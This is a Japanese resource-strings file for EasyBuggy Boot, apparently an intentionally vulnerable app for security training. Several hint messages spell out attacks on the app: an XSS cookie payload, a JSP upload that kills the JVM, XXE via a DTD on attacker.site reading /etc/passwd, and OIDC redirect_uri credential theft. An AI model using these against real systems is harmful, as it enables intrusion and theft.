msg.note.threadstarvation         = <code>{0}</code>\u306E\u30A2\u30AF\u30BB\u30B9\u6A29\u3092\u8AAD\u307F\u66F8\u304D\u304B\u3089\u8AAD\u307F\u53D6\u308A\u5C02\u7528\u306B\u4E00\u6642\u7684\u306B\u5909\u66F4\u3057\u3066\u3053\u306E\u30DA\u30FC\u30B8\u306B\u30A2\u30AF\u30BB\u30B9\u3059\u308B\u3068\u3001\u305D\u308C\u4EE5\u964D\u306F\u3053\u306E\u30DA\u30FC\u30B8\u306B\u30A2\u30AF\u30BB\u30B9\u3067\u304D\u306A\u304F\u306A\u308A\u307E\u3059\uFF08\u30A2\u30AF\u30BB\u30B9\u6A29\u3092\u5143\u306B\u623B\u3057\u305F\u3068\u3057\u3066\u3082\uFF09\u3002
msg.note.threadunsafe             = \u8907\u6570\u306E\u30AF\u30E9\u30A2\u30A4\u30F3\u30C8\u304B\u3089\u540C\u6642\u306B\u591A\u6570\u306E\u30EA\u30AF\u30A8\u30B9\u30C8\u3092\u9001\u4FE1\u3059\u308B\u3068\u3001<code>java.lang.NumberFormatException</code>\u304C\u30B9\u30ED\u30FC\u3055\u308C\u307E\u3059\u3002
msg.note.truncationerror          = 3\u30017\u30019\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u6253\u3061\u5207\u308A\u8AA4\u5DEE\u304C\u767A\u751F\u3057\u307E\u3059\u3002
msg.note.unrestrictedextupload    = <code><% System.exit(0); %></code>\u3068\u66F8\u3044\u305FJSP\u30D5\u30A1\u30A4\u30EB(\u30D5\u30A1\u30A4\u30EB\u540D\uFF1Aexit.jsp)\u3092\u30A2\u30C3\u30D7\u30ED\u30FC\u30C9\u3057\u3066\u3001{0}\u306B\u30A2\u30AF\u30BB\u30B9\u3059\u308B\u3068\u3001JavaVM\u304C\u5F37\u5236\u7D42\u4E86\u3057\u307E\u3059\u3002
msg.note.unrestrictedsizeupload   = \u30A2\u30C3\u30D7\u30ED\u30FC\u30C9\u53EF\u80FD\u306A\u30D5\u30A1\u30A4\u30EB\u30B5\u30A4\u30BA\u306E\u5236\u9650\u304C\u7121\u3044\u305F\u3081\u3001DoS\u653B\u6483\u306A\u3069\u306B\u5BFE\u3057\u3066\u8106\u5F31\u3067\u3059\u3002
msg.note.verbose.errror.message   = <code>admin</code>\u3068<code>password</code>\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u30ED\u30B0\u30A4\u30F3\u3067\u304D\u307E\u3059\u3002\u3053\u306E\u753B\u9762\u3067\u306E\u8A8D\u8A3C\u30A8\u30E9\u30FC\u306E\u30E1\u30C3\u30BB\u30FC\u30B8\u306F\u8A73\u7D30\u904E\u304E\u308B\u305F\u3081\u3001\u30ED\u30B0\u30A4\u30F3\u53EF\u80FD\u306A\u30A2\u30AB\u30A6\u30F3\u30C8\u304C\u63A8\u6E2C\u3057\u3084\u3059\u304F\u306A\u3063\u3066\u3044\u307E\u3059\u3002
msg.note.vulnerabileoidcrp        = \u30ED\u30B0\u30A4\u30F3\u30EA\u30F3\u30AF\u3092\u30AF\u30EA\u30C3\u30AF\u3057\u3001\u8868\u793A\u3055\u308C\u308BURL\u306E\u30AF\u30A8\u30EA\u30FC\u30D1\u30E9\u30E1\u30FC\u30BF\u30FC<code>redirect_uri</code>\u306E\u5024\u3092<code>{0}</code>\u306B\u5909\u66F4\u3057\u3066\u3001\u88AB\u5BB3\u8005\u306B\u30A2\u30AF\u30BB\u30B9\u3055\u305B\u3066\u4E0B\u3055\u3044\u3002\u30A2\u30AF\u30BB\u30B9\u3059\u308B\u3068\u3001\u653B\u6483\u8005\u306E\u30B5\u30A4\u30C8\u306B\u8A98\u5C0E\u3055\u308C\u3001ID\u3068\u30D1\u30B9\u30EF\u30FC\u30C9\u3092\u596A\u3046\u3053\u3068\u304C\u3067\u304D\u307E\u3059\u3002Docker Compose\u3092\u4F7F\u7528\u3057\u3066\u3044\u308B\u5834\u5408\u3001\u653B\u6483\u8005\u306E\u30B5\u30A4\u30C8\u306B\u306F<code>docker exec --user root -it easybuggy4sb_attacker_app_1 bash</code>\u3067\u30ED\u30B0\u30A4\u30F3\u3067\u304D\u3001<code>logs/credential.txt</code>\u306B\u596A\u3063\u305FID\u3068\u30D1\u30B9\u30EF\u30FC\u30C9\u304C\u51FA\u529B\u3055\u308C\u307E\u3059\u3002
msg.note.vulnerabileoidcrp2       = \u653B\u6483\u8005\u306F\u3001\u4EE5\u4E0B\u306E\u624B\u9806\u3067\u8A8D\u53EF\u30B3\u30FC\u30C9\u3092\u5165\u624B\u3067\u304D\u307E\u3059\u3002<br /><ol><li>\u307E\u305A\u306F\u653B\u6483\u8005\u3068\u3057\u3066\u64CD\u4F5C\u3059\u308B\u305F\u3081\u3001\u5225\u30BB\u30C3\u30B7\u30E7\u30F3\u3067\u30D6\u30E9\u30A6\u30B6\u30FC\u3092\u958B\u304D\u307E\u3059\u3002</li><li>\u30ED\u30B0\u30A4\u30F3\u30EA\u30F3\u30AF\u3092\u30AF\u30EA\u30C3\u30AF\u3057\u3001\u653B\u6483\u8005\u306E\u30E6\u30FC\u30B6\u30FC\u3092\u4F5C\u6210\u3057\u307E\u3059\u3002Picture\u6B04\u306B\u306F<code>{0}</code>\u3092\u5165\u529B\u3057\u3066\u4E0B\u3055\u3044\u3002</li><li>\u4F5C\u6210\u3057\u305F\u3089\u3001\u63B2\u793A\u677F\u306B\u4F55\u304B\u3092\u66F8\u304D\u8FBC\u307F\u3001\u30ED\u30B0\u30A2\u30A6\u30C8\u3057\u307E\u3059\u3002</li><li>\u518D\u5EA6\u3053\u306E\u753B\u9762\u306B\u623B\u308A\u3001\u30ED\u30B0\u30A4\u30F3\u30EA\u30F3\u30AF\u3092\u30AF\u30EA\u30C3\u30AF\u3057\u3001\u8868\u793A\u3055\u308C\u308BURL\u306E\u30AF\u30A8\u30EA\u30FC\u30D1\u30E9\u30E1\u30FC\u30BF\u30FC<code>redirect_uri</code>\u306E\u5024\u3092<code>{1}</code>\u306B\u5909\u66F4\u3057\u3066\u3001\u4F55\u3089\u304B\u306E\u65B9\u6CD5\u3067\u88AB\u5BB3\u8005\u306B\u30A2\u30AF\u30BB\u30B9\u3055\u305B\u3066\u4E0B\u3055\u3044\u3002</li><li>\u30A2\u30AF\u30BB\u30B9\u3059\u308B\u3068\u3001\u8A8D\u53EF\u30B3\u30FC\u30C9\u30D5\u30ED\u30FC\u304C\u4E2D\u65AD\u3057\u3001\u653B\u6483\u8005\u306E\u30B5\u30A4\u30C8\u306Breferer\u306B\u8A8D\u53EF\u30B3\u30FC\u30C9\u304C\u542B\u307E\u308C\u308B\u30EA\u30AF\u30A8\u30B9\u30C8\u304C\u9001\u4FE1\u3055\u308C\u307E\u3059\u3002Docker Compose\u3092\u4F7F\u7528\u3057\u3066\u3044\u308B\u5834\u5408\u3001\u653B\u6483\u8005\u306E\u30B5\u30A4\u30C8\u306B\u306F<code>docker exec --user root -it easybuggy4sb_attacker_app_1 bash</code>\u3067\u30ED\u30B0\u30A4\u30F3\u3067\u304D\u307E\u3059\u3002\u8A8D\u53EF\u30B3\u30FC\u30C9\u3092\u542B\u3080URL\u304C<code>logs/localhost_access_log.txt</code>\u306B\u51FA\u529B\u3055\u308C\u307E\u3059\u3002</li></ol>
msg.note.vulnerabileoidcrp3       = \u30ED\u30B0\u30A4\u30F3\u30EA\u30F3\u30AF\u3092\u30AF\u30EA\u30C3\u30AF\u3057\u3001\u8A8D\u53EF\u30EC\u30B9\u30DD\u30F3\u30B9\u306E\u30EA\u30C0\u30A4\u30EC\u30AF\u30C8\u3092\u6B62\u3081\u308B\u3088\u3046\u306B\u30D6\u30E9\u30A6\u30B6\u30FC\u306E\u8A2D\u5B9A\u3092\u4E00\u6642\u7684\u306B\u5909\u66F4\u3057\u307E\u3059\u3002FireFox\u306E\u5834\u5408\u3001\u30D6\u30E9\u30A6\u30B6\u30FC\u306EURL\u30D0\u30FC\u306B<code>about:config</code>\u3092\u5165\u529B\u3057\u3001<code>network.http.redirection-limit</code>\u3092<code>0</code>\u306B\u5909\u66F4\u3059\u308B\u3068\u3001\u30EA\u30C0\u30A4\u30EC\u30AF\u30C8\u3092\u6B62\u3081\u308B\u3053\u3068\u304C\u3067\u304D\u307E\u3059\u3002F12\u30AD\u30FC\u3092\u30AF\u30EA\u30C3\u30AF\u3057\u3066\u3001\u958B\u767A\u8005\u30E2\u30FC\u30C9\u306E\u300C\u30CD\u30C3\u30C8\u30EF\u30FC\u30AF\u300D\u30BF\u30D6\u3092\u8868\u793A\u3057\u305F\u72B6\u614B\u3067\u30ED\u30B0\u30A4\u30F3\u3057\u3066\u4E0B\u3055\u3044\u3002\u30EC\u30B9\u30DD\u30F3\u30B9\u306ELocation\u30D8\u30C3\u30C0\u30FC\u306EURL\u3092\u53D6\u5F97\u3057\u3001\u305D\u308C\u3092\u88AB\u5BB3\u8005\u306B\u4F55\u3089\u304B\u306E\u624B\u6BB5\u3067\u30A2\u30AF\u30BB\u30B9\u3055\u305B\u3066\u4E0B\u3055\u3044\u3002\u3053\u308C\u306B\u3088\u308A\u3001\u88AB\u5BB3\u8005\u306F\u610F\u56F3\u305B\u305A\u3001\u653B\u6483\u8005\u306E\u30A2\u30AB\u30A6\u30F3\u30C8\u3067\u30ED\u30B0\u30A4\u30F3\u3057\u3066\u3057\u307E\u3046\u3053\u3068\u306B\u306A\u308A\u307E\u3059\uFF08\u3064\u307E\u308A\u3001\u653B\u6483\u8005\u306B\u300C\u306A\u308A\u3059\u307E\u3055\u305B\u308B\u300D\uFF09\u3002\u3053\u306E\u72B6\u614B\u306B\u6C17\u3065\u304B\u305A\u306B\u88AB\u5BB3\u8005\u304C\u81EA\u8EAB\u306E\u6A5F\u5BC6\u60C5\u5831\u3092\u767B\u9332\u3059\u308C\u3070\u3001\u653B\u6483\u8005\u306F\u305D\u308C\u3092\u5165\u624B\u3059\u308B\u3053\u3068\u304C\u3067\u304D\u307E\u3059\u3002
msg.note.vulnerabileoidcrp4       = \u5916\u90E8\u304B\u3089\u6D41\u51FA\u3057\u305FID\u3068\u30D1\u30B9\u30EF\u30FC\u30C9\uFF08<code>admin</code>\u3001<code>admin</code>\uFF09\u3067\u30ED\u30B0\u30A4\u30F3\u304C\u3067\u304D\u3066\u3057\u307E\u3044\u307E\u3059\u3002
msg.note.vulnerabileoidcrp5       = \u30D6\u30EB\u30FC\u30C8\u30D5\u30A9\u30FC\u30B9\u653B\u6483\u306B\u3088\u308A\u3001\u30ED\u30B0\u30A4\u30F3\u53EF\u80FD\u306A\u30AF\u30EC\u30C7\u30F3\u30B7\u30E3\u30EB\u304C\u7279\u5B9A\u3067\u304D\u3066\u3057\u307E\u3044\u307E\u3059\u3002
msg.note.weakreference            = \u753B\u9762\u306E\u30ED\u30FC\u30C9\u3092\u7E70\u308A\u8FD4\u3059\u3068\u3001\u30ED\u30B0\u30EC\u30D9\u30EB\u304C\u30C7\u30D5\u30A9\u30EB\u30C8\u306EINFO\u306B\u623B\u308A\u307E\u3059\u3002
msg.note.xee                      = \u4EE5\u4E0B\u306EXML\u30D5\u30A1\u30A4\u30EB\u3092\u30A2\u30C3\u30D7\u30ED\u30FC\u30C9\u3059\u308B\u3068\u3001\u30B5\u30FC\u30D0\u30FC\u30EA\u30BD\u30FC\u30B9\u3092\u6D6A\u8CBB\u3057\u307E\u3059\u3002
msg.note.xss                      = \u540D\u524D\u306B<code>>tpircs/<;)eikooc.tnemucod(trela>tpIrcs<</code>\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u30BB\u30C3\u30B7\u30E7\u30F3ID\u304C\u8868\u793A\u3055\u308C\u307E\u3059\u3002
msg.note.xxe.step1                = \u3053\u306E\u30B5\u30FC\u30D0\u30FC\u304B\u3089\u30A2\u30AF\u30BB\u30B9\u3067\u304D\u308BWeb\u30B5\u30FC\u30D0\u30FC\u306B\u6B21\u306EDTD\u30D5\u30A1\u30A4\u30EB\u3092\u4F5C\u6210\u3057\u307E\u3059\u3002\u4F8B) http://attacker.site/vulnerable.dtd
msg.note.xxe.step2                = \u6B21\u306B\u4EE5\u4E0B\u306EXML\u30D5\u30A1\u30A4\u30EB\u3092\u30A2\u30C3\u30D7\u30ED\u30FC\u30C9\u3059\u308B\u3068\u3001Linux\u30B5\u30FC\u30D0\u30FC\u306E\u30D1\u30B9\u30EF\u30FC\u30C9\u30D5\u30A1\u30A4\u30EB(/etc/passwd)\u304C\u8868\u793A\u3067\u304D\u307E\u3059\u3002
msg.passwd.change.failed          = \u30D1\u30B9\u30EF\u30FC\u30C9\u306E\u5909\u66F4\u306B\u5931\u6557\u3057\u307E\u3057\u305F\u3002
msg.passwd.changed                = \u30D1\u30B9\u30EF\u30FC\u30C9\u306F\u6B63\u5E38\u306B\u5909\u66F4\u3055\u308C\u307E\u3057\u305F\u3002
msg.passwd.is.too.short           = \u30D1\u30B9\u30EF\u30FC\u30C9\u306F8\u6841\u4EE5\u4E0A\u306B\u3057\u3066\u4E0B\u3055\u3044\u3002
msg.password.not.match            = \u30D1\u30B9\u30EF\u30FC\u30C9\u304C\u4E00\u81F4\u3057\u307E\u305B\u3093\u3002
msg.permgen.space.leak.occur      = \u3053\u306E\u30DA\u30FC\u30B8\u3092\u8AAD\u307F\u8FBC\u3080\u305F\u3073\u306B\u3001{0}\u306E\u30E1\u30E2\u30EA\u30EA\u30FC\u30AF\u304C\u767A\u751F\u3057\u307E\u3059\u3002\u753B\u9762\u3092\u30ED\u30FC\u30C9\u3057\u7D9A\u3051\u308B\u3068\u3001\u6700\u7D42\u7684\u306BOutOfMemoryError\u304C\u30B9\u30ED\u30FC\u3055\u308C\u307E\u3059\u3002
msg.question.reach.the.moon       = 0.1mm\u306E\u539A\u3055\u306E\u7D19\u3092\u4F55\u56DE\u6298\u308A\u305F\u305F\u3080\u3068\u3001\u5730\u7403\u304B\u3089\u6708\u306E\u8DDD\u96E2(384,400km)\u306B\u5230\u9054\u3059\u308B\u3067\u3057\u3087\u3046\u304B\uFF1F
msg.reverse.color                 = \u753B\u50CF\u30D5\u30A1\u30A4\u30EB\u306E\u8272\u53CD\u8EE2\u3092\u884C\u3046\u3053\u3068\u304C\u3067\u304D\u307E\u3059\u3002
msg.reverse.color.complete        = \u753B\u50CF\u30D5\u30A1\u30A4\u30EB\u306E\u8272\u53CD\u8EE2\u304C\u5B8C\u4E86\u3057\u307E\u3057\u305F\u3002
msg.reverse.color.fail            = \u753B\u50CF\u30D5\u30A1\u30A4\u30EB\u306E\u8272\u53CD\u8EE2\u306B\u5931\u6557\u3057\u307E\u3057\u305F\u3002
msg.select.log.level              = \u3053\u306E\u6A5F\u80FD\u306E\u307F\u3067\u4F7F\u7528\u3055\u308C\u308B\u30B3\u30F3\u30BD\u30FC\u30EB\u30ED\u30AC\u30FC\u306E\u30ED\u30B0\u30EC\u30D9\u30EB\u3092\u9078\u629E\u3057\u3066\u4E0B\u3055\u3044\u3002
msg.select.or.enter.style         = \u3053\u306E\u30DA\u30FC\u30B8\u306B\u9069\u7528\u3059\u308B\u30B9\u30BF\u30A4\u30EB(CSS)\u3092\u9078\u629E\u3059\u308B\u304B\u5165\u529B\u3057\u3066\u4E0B\u3055\u3044\u3002
msg.select.upload.file            = \u30A2\u30C3\u30D7\u30ED\u30FC\u30C9\u3059\u308B\u30D5\u30A1\u30A4\u30EB\u3092\u9078\u629E\u3057\u3066\u4E0B\u3055\u3044\u3002
msg.select.year                   = \u5E74\u3092\u9078\u629E\u3057\u3066\u4E0B\u3055\u3044\u3002
msg.sent.mail                     = \u30E1\u30FC\u30EB\u304C\u6B63\u5E38\u306B\u9001\u4FE1\u3055\u308C\u307E\u3057\u305F\u3002
msg.unknown.exception.occur       = \u4F55\u3089\u304B\u306E\u4F8B\u5916\u304C\u767A\u751F\u3057\u307E\u3057\u305F : {0}
msg.update.records                = {0}\u4EF6\u66F4\u65B0\u3057\u307E\u3057\u305F\u3002
msg.update.users                  = \u30E6\u30FC\u30B6\u30FC\u60C5\u5831\u3092\u4E00\u62EC\u3067\u66F4\u65B0\u3057\u307E\u3059\u3002
msg.update.users.by.xml           = \u6B21\u306E\u5F62\u5F0F\u306EXML\u30D5\u30A1\u30A4\u30EB\u3092\u30A2\u30C3\u30D7\u30ED\u30FC\u30C9\u3059\u308B\u3068\u3001\u30E6\u30FC\u30B6\u30FC\u304C\u4E00\u62EC\u3067\u66F4\u65B0\u3067\u304D\u307E\u3059\u3002
msg.user.already.exist            = \u65E2\u306B\u30E6\u30FC\u30B6\u30FC\u304C\u5B58\u5728\u3057\u307E\u3059\u3002
msg.user.not.exist                = \u30E6\u30FC\u30B6\u30FC\u304C\u5B58\u5728\u3057\u307E\u305B\u3093\u3002
msg.valid.json                    = \u6B63\u3057\u3044JSON\u6587\u5B57\u5217\u3067\u3059\u3002
msg.warn.enter.name.and.passwd    = \u540D\u524D\u3068\u30D1\u30B9\u30EF\u30FC\u30C9\u3092\u5165\u529B\u3057\u3066\u4E0B\u3055\u3044\u3002

section.errors            = \u30A8\u30E9\u30FC
section.exceptions        = \u975E\u30C1\u30A7\u30C3\u30AF\u4F8B\u5916
section.performance.issue = \u6027\u80FD\u554F\u984C
section.troubles          = \u969C\u5BB3
section.vulnerabilities   = \u8106\u5F31\u6027

style.description.basic       = \u30D9\u30FC\u30B7\u30C3\u30AF\u306A\u30D8\u30C3\u30C0\u30FC\u3068\u30D5\u30C3\u30BF\u30FC\u304C\u4F7F\u7528\u3055\u308C\u307E\u3059\u3002
style.description.bootstrap   = \u8A73\u7D30\u306F\u6B21\u306E\u30DA\u30FC\u30B8\u3092\u53C2\u7167\u4E0B\u3055\u3044: http://getbootstrap.com/
style.description.google.mdl  = \u8A73\u7D30\u306F\u6B21\u306E\u30DA\u30FC\u30B8\u3092\u53C2\u7167\u4E0B\u3055\u3044: https://getmdl.io/
style.description.materialize = \u8A73\u7D30\u306F\u6B21\u306E\u30DA\u30FC\u30B8\u3092\u53C2\u7167\u4E0B\u3055\u3044: http://materializecss.com/
style.description.monochro    = \u30E2\u30CE\u30AF\u30ED\u306E\u30D8\u30C3\u30C0\u30FC\u3068\u30D5\u30C3\u30BF\u30FC\u304C\u4F7F\u7528\u3055\u308C\u307E\u3059\u3002
style.description.noframe     = \u30D8\u30C3\u30C0\u30FC\u3068\u30D5\u30C3\u30BF\u30FC\u306F\u4F7F\u7528\u3055\u308C\u307E\u305B\u3093\u3002
style.description.nonstyle    = \u30B9\u30BF\u30A4\u30EB\u30B7\u30FC\u30C8\u3092\u6307\u5B9A\u3057\u307E\u305B\u3093\u3002
style.name.basic              = \u30D9\u30FC\u30B7\u30C3\u30AF
style.name.bootstrap          = Bootstrap
style.name.google.mdl         = Google Material Design Lite
style.name.materialize        = Materialize
style.name.monochro           = \u30E2\u30CE\u30AF\u30ED\u30FC\u30E0
style.name.noframe            = \u30D5\u30EC\u30FC\u30E0\u306A\u3057
style.name.nonstyle           = \u30B9\u30BF\u30A4\u30EB\u30B7\u30FC\u30C8\u672A\u6307\u5B9A

title.adminmain.page              = \u7BA1\u7406\u8005\u5411\u3051\u30E1\u30A4\u30F3\u30DA\u30FC\u30B8
title.clickjacking.page           = \u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9\u5909\u66F4
title.clientinfo.page             = \u30AF\u30E9\u30A4\u30A2\u30F3\u30C8\u60C5\u5831
title.codeinjection.page          = JSON\u306E\u89E3\u6790
title.commandinjection.page       = \u6570\u5024\u51E6\u7406\u306E\u5B9F\u884C
title.createobjects.page          = \u81EA\u7136\u6570\u306E\u7DCF\u548C
title.csrf.page                   = \u30D1\u30B9\u30EF\u30FC\u30C9\u5909\u66F4
title.cssinjection.page           = \u30B9\u30BF\u30A4\u30EB\u306E\u5909\u66F4
title.current.date                = \u73FE\u5728\u65E5\u4ED8\u306E\u8868\u793A
title.current.time                = \u73FE\u5728\u6642\u523B\u306E\u8868\u793A
title.dbconnectionleak.page       = \u30E6\u30FC\u30B6\u30FC\u4E00\u89A7
title.deadlock.page               = \u30C7\u30C3\u30C9\u30ED\u30C3\u30AF\u306E\u691C\u77E5
title.design.test.page            = \u30C7\u30B6\u30A4\u30F3\u30C6\u30B9\u30C8
title.endlesswaiting.page         = \u30D0\u30C3\u30C1\u306E\u5B9F\u884C
title.filedescriptorleak.page     = \u30A2\u30AF\u30BB\u30B9\u5C65\u6B74
title.index.page                  = EasyBuggy Boot
title.intoverflow.page            = \u6708\u307E\u3067\u306E\u8DDD\u96E2
title.livelock.page               = \u30B9\u30EC\u30C3\u30C9\u30C0\u30F3\u30D7
title.login.page                  = \u7BA1\u7406\u8005\u30ED\u30B0\u30A4\u30F3\u30DA\u30FC\u30B8
title.lossoftrailingdigits.page   = \u5C0F\u6570\u306E\u8DB3\u3057\u7B97
title.mailheaderinjection.page    = \u7BA1\u7406\u8005\u3078\u306E\u554F\u3044\u5408\u308F\u305B
title.memoryleak.page             = \u30D2\u30FC\u30D7\u30E1\u30E2\u30EA\u306E\u4F7F\u7528\u91CF
title.memoryleak2.page            = \u975E\u30D2\u30FC\u30D7\u30E1\u30E2\u30EA\u306E\u4F7F\u7528\u91CF
title.memoryleak3.page            = \u30BF\u30A4\u30E0\u30BE\u30FC\u30F3\u60C5\u5831
title.memoryleak3.page.list       = \u30BF\u30A4\u30E0\u30BE\u30FC\u30F3\u306E\u4E00\u89A7
title.mojibake.page               = \u6587\u5B57\u5217\u306E\u5148\u982D\u5927\u6587\u5B57\u5316
title.netsocketleak.page          = \u5FDC\u7B54\u6642\u9593\u306E\u6E2C\u5B9A
title.nullbyteinjection.page      = \u30AC\u30A4\u30C9\u306E\u30C0\u30A6\u30F3\u30ED\u30FC\u30C9
title.roundofferror.page          = \u7C21\u5358\u306A\u5F15\u304D\u7B97
title.serverinfo.page             = \u30B5\u30FC\u30D0\u30FC\u60C5\u5831
title.slowregex.page              = \u6B63\u898F\u8868\u73FE\u306E\u30C6\u30B9\u30C8
title.sqlijc.page                 = \u6697\u8A3C\u756A\u53F7\u691C\u7D22
title.strplusopr.page             = \u30E9\u30F3\u30C0\u30E0\u306A\u6587\u5B57\u5217\u3092\u751F\u6210
title.threadleak.page             = \u73FE\u5728\u306E\u30B9\u30EC\u30C3\u30C9\u6570\u306E\u8868\u793A
title.threadstarvation.page       = \u30A2\u30AF\u30BB\u30B9\u72B6\u6CC1
title.threadunsafe.page           = \u3046\u308B\u3046\u5E74\u306E\u5224\u5B9A
title.truncationerror.page        = \u5C0F\u6570\u306E\u5272\u308A\u7B97
title.unrestrictedextupload.page  = \u753B\u50CF\u30D5\u30A1\u30A4\u30EB\u306E\u30B0\u30EC\u30FC\u30B9\u30B1\u30FC\u30EB\u5909\u63DB
title.unrestrictedsizeupload.page = \u753B\u50CF\u30D5\u30A1\u30A4\u30EB\u306E\u8272\u53CD\u8EE2
title.vulnerabileoidcrp.page      = \u30DB\u30FC\u30E0
title.vulnerabileoidcrp2.page     = \u63B2\u793A\u677F
title.weakreference.page          = \u30B3\u30F3\u30BD\u30FC\u30EB\u30ED\u30AC\u30FC\u306E\u30C6\u30B9\u30C8
title.xee.page                    = \u30E6\u30FC\u30B6\u30FC\u306E\u4E00\u62EC\u767B\u9332
title.xss.page                    = \u6587\u5B57\u5217\u306E\u9006\u8EE2
title.xxe.page                    = \u30E6\u30FC\u30B6\u30FC\u306E\u4E00\u62EC\u66F4\u65B0
